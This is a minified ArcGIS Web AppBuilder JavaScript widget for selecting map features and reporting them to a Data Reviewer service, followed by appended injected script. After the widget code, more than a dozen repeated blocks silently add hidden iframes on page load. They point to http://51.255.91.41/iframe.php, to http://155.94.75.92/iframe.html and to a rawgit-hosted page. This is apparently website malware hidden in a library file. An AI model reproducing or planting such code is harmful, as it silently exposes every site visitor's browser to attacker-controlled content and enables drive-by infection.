// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/ReportFeature/SelectFeatureDialog.html":'\x3cdiv\x3e\r\n\t\x3cp style\x3d"width:90%;height:25px;margin: 20px 5px 0px 7px;"\x3e${nls.chooseALayer}: \x3c/p\x3e\r\n\t\x3cselect data-dojo-attach-point\x3d"selectLayer"  class\x3d"jimu-input" style\x3d"width:90%;height:31px;margin: 5px 5px 5px 7px;"\x3e\r\n    \x3coption value\x3d""\x3e\x3c/option\x3e\r\n  \x3c/select\x3e\r\n  \r\n  \x3cp style\x3d"display: none;" data-dojo-attach-point\x3d"clickAFeatureNode"  style\x3d"width:90%;height:25px;margin: 5px 5px 5px 7px;" \x3e${nls.clickAFeature}\x3c/p\x3e\r\n  \x3cp class\x3d"drs-loading-features" style\x3d"display: none;" data-dojo-attach-point\x3d"loadingFeaturesNode" \x3e${nls.loadingFeatures}\x3c/p\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/on dojo/string dojo/dom-construct dojo/dom-style dijit/_WidgetBase dijit/_TemplatedMixin dojo/query dojo/i18n!esri/nls/jsapi esri/main esri/layers/FeatureLayer esri/toolbars/draw esri/tasks/IdentifyTask esri/tasks/query esri/tasks/IdentifyParameters esri/symbols/SimpleMarkerSymbol esri/symbols/SimpleLineSymbol esri/symbols/SimpleFillSymbol esri/geometry/Extent esri/tasks/datareviewer/ReviewerResultsTask ./InfoWindowContent dojo/text!./SelectFeatureDialog.html".split(" "),
function(q,h,k,g,r,l,f,t,u,m,v,w,n,e,x,y,z,A,B,C,D,E,F,G){var H=new A({type:"esriSMS",style:"esriSMSCircle",size:12,xoffset:0,yoffset:0,color:[0,0,255,51],outline:{type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,128],width:1}}),p=new B({type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,51],width:2}),I=new C({type:"esriSFS",style:"esriSFSSolid",color:[0,0,255,26],outline:{type:"esriSLS",style:"esriSLSSolid",color:[0,0,255,128],width:1}});return q([t,u],{templateString:G,baseClass:"drs-widget-selectFeature",
buildRendering:function(){this.inherited(arguments);this._initDom()},_initDom:function(){var a=this.getLayerOptions();void 0!==a&&""!==a&&l.place(a,this.selectLayer)},postCreate:function(){this.inherited(arguments);this._initEvents()},_initEvents:function(){var a=this;this.selectionToolbar=new e(this.map);this.selectionToolbar.on("draw-end",k.hitch(this,this.addGraphic));this.own(g(this.selectLayer,"change",function(b){v.toolbars.draw.addPoint=a.nls.selectFeatureMapPoint;(b=b.target.value)?a.startSelectFeature(b):
a.cancelSelectFeature()}));this.own(g(this.map.infoWindow,"hide",function(){var b=m(".actionsPane");void 0!==b&&null!==b&&0<b.length&&(b[0].style.display="");a.emit("InfoWindowHide")}))},startSelectFeature:function(a){var b;b=h.filter(this.config.layers,function(b){return b.id===a});if(void 0!==b&&0<b.length&&(b=this.map.getLayer(a),void 0===b)){this.emit("Error",{},[this.nls.errorMapService]);return}this.selectionToolbar.activate(e.POINT);f.set(this.clickAFeatureNode,"display","")},addGraphic:function(a){var b=
this.selectLayer.value,c=h.filter(this.config.layers,function(a){return a.id===b});a=a.geometry;if("ArcGISMapServiceLayer"===c[0].layerType)this.identifyTask=new x(c[0].url),this._identifyFeatures(a);else{null!==this.featureLayer&&void 0!==this.featureLayer&&(this.featureLayer=null);this.featureLayer=new n(c[0].url,{outFields:["*"],mode:w.layers.FeatureLayer.MODE_SELECTION});var c=new y,d=10*(this.map.extent.getWidth()/this.map.width);a=new D(a.x-d,a.y-d,a.x+d,a.y+d,this.map.spatialReference);c.geometry=
a;this.featureLayer.selectFeatures(c,n.SELECTION_NEW,k.hitch(this,function(a){1<a.length?this.emit("Message",{},[this.nls.manyFeaturesSelected]):1===a.length?(this.selectionToolbar.deactivate(),this._onTaskComplete(a[0])):this.emit("Message",{},[this.nls.noFeatureSelected])}))}},cancelSelectFeature:function(){null!==this.selectionToolbar&&void 0!==this.selectionToolbar&&""===this.selectLayer.value&&this.selectionToolbar.deactivate();f.set(this.clickAFeatureNode,"display","none")},_identifyFeatures:function(a){var b=
this,c=new z;this.identifying||(this.identifying=!0,f.set(this.loadingFeaturesNode,"display",""),c.returnGeometry=!0,c.width=this.map.width,c.height=this.map.height,c.tolerance=3,c.geometry=a,c.mapExtent=this.map.extent,c.spatialReference=this.map.spatialReference,this.identifyTask.execute(c).then(function(a){0<a.length?(b.selectionToolbar.deactivate(),b._onTaskComplete(a[0].feature)):(f.set(b.loadingFeaturesNode,"display","none"),b.identifying=!1,this.emit("Message",{},[this.nls.noFeatureSelected]))},
function(a){b._onIdentifyError(a)}))},_onTaskComplete:function(a){var b=this,c,d;this.identifying=!1;f.set(this.loadingFeaturesNode,"display","none");if(a){var e=this.selectLayer.value,g=h.filter(this.config.layers,function(a){return a.id===e});this._selectedFeature=a;switch(a.geometry.type){case "point":a.setSymbol(H);d=a.geometry;c=this.map.centerAt(a.geometry);break;case "polyline":a.setSymbol(p);d=a.geometry.getExtent().getCenter();a.setSymbol(p);c=this.map.centerAt(d);break;case "polygon":a.setSymbol(I),
d=a.geometry.getCentroid(),c=this.map.centerAt(d)}c.then(function(){b._showInfoWindow(g[0].alias,d,a)})}},_showInfoWindow:function(a,b,c){var d=this;this.infoWindowContent=new F({nls:this.nls,title:this.nls.select,includeReportedBy:this.config.includeReportedBy,defaultUserName:this.config.defaultUserName,onReportSubmit:function(a){d.submitReport(a)}},l.create("div"));this.map.infoWindow.setTitle(this.nls.infoWindowTitle);this.infoWindowContent.startup();this.infoWindowContent.set("layerName",a);this.infoWindowContent.set("graphic",
c);g.once(this.map.infoWindow,"hide",function(){d.selectionToolbar.activate(e.POINT);d.map.setInfoWindowOnClick(!1)});this.map.infoWindow.destroyDijits();m(".actionsPane")[0].style.display="none";this.map.infoWindow.setContent(this.infoWindowContent.domNode);this.map.infoWindow.resize(300,600);this.map.infoWindow.show(b);this.emit("SelectFeature")},_onIdentifyError:function(a){this.identifying=!1;f.set(this.loadingFeaturesNode,"display","none");this.emit("Error",{},[this.nls.errorIdentify,a])},submitReport:function(a){var b=
this;a.sessionId=this._sessionId;this.map.infoWindow.hide();this._reviewerResultsTask.writeFeatureAsResult(a,this._selectedFeature).then(function(a,d){b._onWriteFeatureAsResultComplete(a,d)},function(a){b._onWriteFeatureAsResultError(a)})},_onWriteFeatureAsResultComplete:function(a){a&&a.success?(this.emit("Message",{},["",this.nls.reportMessage]),this.selectionToolbar.activate(e.POINT)):this.emit("Error",{}[this.nls.errorReportMessage])},_onWriteFeatureAsResultError:function(a){this.selectionToolbar.activate(e.POINT);
this.emit("Error",{},[a.message,a])},reset:function(){this.selectLayer.selectedIndex=0;this.cancelSelectFeature();void 0!==this.infoWindowContent&&null!==this.infoWindowContent&&this.infoWindowContent.destroyRecursive();this.map.setInfoWindowOnClick(!1)},setDrsUrl:function(a){this._reviewerResultsTask=new E(a)},setReviewerSession:function(a){isNaN(a)?this._sessionId=1:this._sessionId=parseInt(a,10)},getLayerOptions:function(){var a="";h.forEach(this.config.layers,function(b){!0===b.show&&(a+=r.substitute('\x3coption value\x3d"${id}"\x3e${alias}\x3c/option\x3e',
b))});return a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});